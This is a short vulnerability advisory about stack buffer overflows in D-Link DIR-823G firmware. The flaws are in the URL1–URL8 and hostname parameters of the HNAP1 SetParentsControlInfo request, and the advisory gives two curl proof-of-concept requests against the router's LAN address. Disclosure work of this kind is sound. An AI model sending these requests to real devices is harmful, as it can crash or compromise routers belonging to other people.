# DIR823G_V1.0.2B05_20181207.bin Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823G

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

When the program processes URL1 to URL8 parameters, it uses the size of the parameter string as maxlen, which will cause a buffer overflow.

![](img/2.jpg#center)

When the program processes hostname parameter, it uses the size of the parameter string as maxlen, which will cause a buffer overflow.
![](img/3.jpg#center)


## URL parameter

### Vulnerability verify

![](img/4.jpg#center)




### POC

```
curl http://192.168.0.1/HNAP1/ -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetParentsControlInfo"' -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetParentsControlInfo xmlns="http://purenetworks.com/HNAP1/"><UsersInfo><HostName>1</HostName><Mac>1</Mac><IndexEnable>1</IndexEnable><StartTime>00:00:00</StartTime><EndTime>23:59:00</EndTime><Week>Sun</Week><UrlEnable>1</UrlEnable><URL1>cp.com</URL1><URL2></URL2><URL3></URL3><URL4></URL4><URL5></URL5><URL6></URL6><URL7></URL7><URL8></URL8><GroupId>1</GroupId></UsersInfo></SetParentsControlInfo></soap:Body></soap:Envelope>'
```


## Hostname parameter

### Vulnerability verify

![](img/5.jpg#center)




### POC

```
curl http://192.168.0.1/HNAP1/ -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetParentsControlInfo"' -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetParentsControlInfo xmlns="http://purenetworks.com/HNAP1/"><UsersInfo><HostName></HostName><Mac>1</Mac><IndexEnable>1</IndexEnable><StartTime>00:00:00</StartTime><EndTime>23:59:00</EndTime><Week>Sun</Week><UrlEnable>0</UrlEnable><GroupId>1</GroupId></UsersInfo></SetParentsControlInfo></soap:Body></soap:Envelope>'
```
